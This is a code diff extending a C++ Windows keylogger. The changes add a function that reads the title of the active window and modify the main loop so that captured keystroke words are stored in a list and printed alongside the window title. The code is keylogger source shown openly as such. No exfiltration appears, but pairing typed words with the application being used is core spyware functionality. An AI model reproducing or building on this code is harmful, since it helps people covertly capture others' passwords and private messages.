@@ -6,6 +6,10 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
+#include <functional>
+#include <atlstr.h>
+#include <locale>
+#include <codecvt>
 
 
 bool IsSpecialKey(int S_Key) {
@@ -34,7 +38,7 @@ class KeyLogger {
     /*
     * Start the KeyLogger loop.
     */
-public: static void start(void(*charCallback)(char), void(*wordCallback)(std::string))
+public: static void start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
     {
         std::string word;
         while (true) {
@@ -95,23 +99,46 @@ public: static void start(void(*charCallback)(char), void(*wordCallback)(std::st
     /*
     * Return the current pressed key or null
     */
-    public: static void forEachWord(void(*callback)(std::string))
+    public: static void forEachWord(const std::function<void(std::string)>& callback)
     {
         KeyLogger::start([](char c){}, callback);
     }
 };
 
+std::wstring s2ws(const std::string& str)
+{
+    using convert_typeX = std::codecvt_utf8<wchar_t>;
+    std::wstring_convert<convert_typeX, wchar_t> converterX;
+
+    return converterX.from_bytes(str);
+}
+
+std::string ws2s(const std::wstring& wstr)
+{
+    using convert_typeX = std::codecvt_utf8<wchar_t>;
+    std::wstring_convert<convert_typeX, wchar_t> converterX;
+    return converterX.to_bytes(wstr);
+}
+
+
+std::string GetActiveWindowTitle()
+{
+    //LPSTR wnd_title;
+    char wnd_title[256];
+    HWND hwnd = GetForegroundWindow(); // get handle of currently active window
+    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
+    std::string name = wnd_title;
+    return name;
+}
+
 int main()
 {
-    // KeyLogger::forEachChar([](char character) {
-        // std::cout << character;
-    // });
-
     std::vector<std::string> words;
+    std::cout << GetActiveWindowTitle();
     // for (const auto& value: words) std::cout << value + char(VK_SPACE);
-    KeyLogger::forEachWord([](std::string word) {
-        // (words).push_back(word);
-        std::cout << word;
+    KeyLogger::forEachWord([&words](std::string word) {
+        words.push_back(word);
+        std::cout << word ;
     });
     return 0;
 }
